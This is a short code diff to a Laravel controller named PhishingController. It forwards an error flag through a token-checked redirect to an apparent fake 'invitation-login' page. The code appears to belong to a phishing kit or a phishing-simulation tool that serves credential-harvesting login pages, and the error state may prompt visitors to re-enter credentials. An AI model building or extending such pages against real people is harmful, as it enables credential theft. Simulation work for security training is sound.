@@ -183,11 +183,16 @@ class PhishingController extends Controller
         if (!session('_lv2_token') || $request->query('token') !== session('_lv2_token')) {
             $newToken = Str::random(200);
             session(['_lv2_token' => $newToken]);
-            return redirect('/invitation-login?token=' . $newToken);
+            $params = ['token' => $newToken];
+            if ($request->has('error')) {
+                $params['error'] = $request->query('error');
+            }
+            return redirect('/invitation-login?' . http_build_query($params));
         }
         return view('login2v2', [
             'metaBasePath' => $session['metaBasePath'],
-            'authPath' => $session['authPath']
+            'authPath' => $session['authPath'],
+            'hasError' => $request->has('error')
         ]);
     }
 
